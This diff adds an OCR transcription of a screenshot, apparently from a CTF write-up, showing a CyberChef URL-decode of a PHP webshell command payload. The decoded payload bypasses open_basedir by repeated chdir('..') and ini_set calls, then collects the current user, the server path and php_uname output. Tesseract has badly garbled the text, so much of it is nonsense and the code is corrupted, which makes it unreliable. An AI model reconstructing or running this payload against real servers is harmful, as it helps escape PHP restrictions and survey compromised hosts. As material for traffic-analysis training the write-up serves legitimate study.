@@ -1,0 +1,35 @@
+# OCR: 621f69745d981ae3b1afa3fc5a57a891.jpg
+# 来源: .\02-WriteUp\2024\621f69745d981ae3b1afa3fc5a57a891.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:30
+
+Recipe
+URL Decode
+amt
+ou
+Input 十 口 日 目 匿
+nLitputppioorrscpepiepooseet t lnttJoupuetnoenLnttiee edtrayttita
+‘opdir)X20X78X240parr30preg._ nlittomrscacscacicacorraooperarJeuosnoarstauseeensezse
+Lhintweunolouptiraou IiecapuestiratnarJeueodrtatniniosuein_oettoio nedral
+xcolJoucrtautmeeepunoterainraspdneoJoecesertai.xJeicposini ri
+PncbupppJJogueniirtauen uru RtminiapopetactiemotmfauntJDinurapeonepuotne
+JoupeseepeOmepuotpvpee tn n0ateiepeiedzol 229F FeceX22%3BechoX2OAaasenc (X2
+nnosoopezuponuouietbupepo urt0ientuacodrosooctesenueun uawezooojs
+itaupopopyiyosotmuetau pnetitininLiusurgpzajeuttzIpeuoppeppittitcsorze
+‘x2cenaca 15302242422) 37BForeach( range(%22C%22%2C%227%22 )ask2ON2AL )if(4s_ trCozpeptponeuyJaat senopenap
+x3A422420870e] seX7BR2AR., X2D%22R2FRADAGERTOADAR, XBO22°00H22~I8X2UAAD(Functon_ exists (K22posix_getegisK22) )IFLOpOSiX g
+cetpuui(40posix_geteuid())X34X22%22%38%245%30 (224u) 23 FEAUSEXZ2naneX22XSOLSACOget_current_usen()X3BX248.%30php_uname(
+)3B%24R.30K2ZX09R7BR24SK7ORZZX3BechoK2ER2SRASBLIBL7DCAt Ch Except ionk2OX24e)RTBeCchoX2RZ2ERRORESARZFRIFAZ.X240~
+xaegethessage()30X70%38asoutput()X3Bdie()X3B.
+E E
+Output aon
+ind_set(-Glsplay errors", “O-)fiset_tine_limit(e);Sopdir-@int_get(“open_basedin);1F(Sopdin)
+joparr=preg splie( 7 WTW7sbopdir);Socud=dirnane($_SERVER{"SCRIPT_FILENAME”]);Stedin=".7abecd”s@ekéin(Stmdie) j@chdie
+(Stndir) ;@ini_set(“open_basedir™,”..");for(Si-e;$icsizeot(Soparr) $i++)
+{Gchdir("..");)Bini_set(“open_basedin”,"/");@radin(Socud."/".Stmdir);};function asenc(Sout){retuen Sout;};Function
+asoutput(){Soutput=ob_get_contents();0b_end_clean() ;echo “db5d2"."9Ffeca” echo @asenc(Soutput) echo
+-2453"."25eb2"; }ob_start(); try {$0=dirnane($_SERVER["SCRIPT_FILENAME™]);1F($D=x"")$Dadirnase($_SERVER["PATH_TRANSLATEO"])
+SRe"{50} "si (subste($0,0,1)!="/") {Foreach(range("C","2")as i
+*;$ue(Function_exists ("posix getegid"))%@p0s1x_getpwutd(@posix geteuid()):"":55-(Su)?
+Su[name") :@get_current_user);$R-=php_unane();§R.=" e $R;;}catch(Exception $2){echo “ERROR://".$2-
+>getNessage();)sasoutput():die();
